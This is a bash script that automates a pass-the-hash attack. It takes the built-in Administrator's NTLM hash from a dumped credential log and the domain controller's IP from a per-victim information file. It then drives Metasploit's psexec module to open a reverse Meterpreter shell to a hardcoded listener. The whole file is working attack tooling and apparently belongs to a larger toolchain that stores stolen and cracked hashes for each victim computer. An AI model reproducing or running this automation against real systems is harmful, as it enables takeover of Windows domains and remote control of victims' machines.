#!/bin/bash

# Set the base folder paths
BASE_FOLDER="data"
UPLOAD_FOLDER="uploaded_files"
DECRYPTED_FOLDER="decrypted_files"
HASH_FOLDER="hashes"
DEHASH_FOLDER="decrypted_hashes"

# Function to get the computer folder path
get_computer_folder() {
    local computer_id=$1
    echo "${BASE_FOLDER}/${computer_id}"
}

# Function to get the sub-folder path
get_sub_folder() {
    local computer_id=$1
    local sub_folder_name=$2
    echo "$(get_computer_folder ${computer_id})/${sub_folder_name}"
}

# Example usage
computer_id="$1"
my_ip="192.168.1.6"

# Print the folder paths (for demonstration purposes)
# echo "Computer folder: $(get_computer_folder ${computer_id})"
# echo "Upload folder: $(get_sub_folder ${computer_id} ${UPLOAD_FOLDER})"
# echo "Decrypted folder: $(get_sub_folder ${computer_id} ${DECRYPTED_FOLDER})"
# echo "Hash folder: $(get_sub_folder ${computer_id} ${HASH_FOLDER})"
# echo "DeHash folder: $(get_sub_folder ${computer_id} ${HASH_FOLDER}/${DEHASH_FOLDER})"

logfile_path="$(get_sub_folder ${computer_id} ${HASH_FOLDER}/${DEHASH_FOLDER})/LOGFILE.txt"
information_file="$(get_computer_folder ${computer_id})/information.txt"

# Check if the logfile exists
if [[ -f "$logfile_path" ]]; then
    # Extract the line containing '500' in the first column
    line=$(grep -E '^500\s' "$logfile_path")
    
    if [[ -n "$line" ]]; then
        # Separate the values into variables
        read -r perms user ntlm col4 <<< "$line"
        
        # Print the variables
        echo "Perms: $perms"
        echo "User: $user"
        echo "NTLM: $ntlm"
        echo "Column 4: $col4"
    else
        echo "No line starting with '500' found in LOGFILE.txt."
    fi
else
    echo "LOGFILE.txt not found in the expected directory."
fi

# Check if the information file exists
if [[ -f "$information_file" ]]; then
    # Extract Domain Name and Domain IP Address from information.txt
    domain_name=$(grep -Po '"Domain Name": *"\K[^"]*' "$information_file")
    domain_ip=$(grep -Po '"Domain IP Address": *"\K[^"]*' "$information_file")
    
    # Print the extracted information
    echo "Domain Name: $domain_name"
    echo "Domain IP Address: $domain_ip"

    # Write the expect script to a temporary file
    expect_script=$(mktemp)
    cat <<EOF > $expect_script
spawn msfconsole
expect "msf6 >"
send "use exploit/windows/smb/psexec\r"
expect "msf6 exploit(windows/smb/psexec) >"
send "set PAYLOAD windows/meterpreter/reverse_tcp\r"
expect "PAYLOAD =>"
send "set RHOST $domain_ip\r"
expect "RHOST =>"
send "set LHOST $my_ip\r"
expect "LHOST =>"
send "set SMBUser $user\r"
expect "SMBUser =>"
send "set SMBPass aad3b435b51404eeaad3b435b51404ee:$ntlm\r"
expect "SMBPass =>"
send "set LPORT 4446\r"
expect "LPORT =>"
send "exploit -j -z\r"
expect {
    "Meterpreter session" {
        # Capture the session ID from the output
        set output $expect_out(buffer)
        regexp {Meterpreter session (\d+) opened} $output -> session_id
        send "sessions -i $session_id\r"
        expect "msf6 exploit(windows/smb/psexec) >"
        interact
    }
    timeout {
        puts "Timeout occurred while waiting for Meterpreter session."
        exit 1
    }
}
EOF

    # Open a new terminal and run the expect script
    gnome-terminal -- bash -c "expect $expect_script; exec bash"

    # Clean up the temporary expect script
    rm $expect_script

else
    echo "information.txt not found in the expected directory."
fi
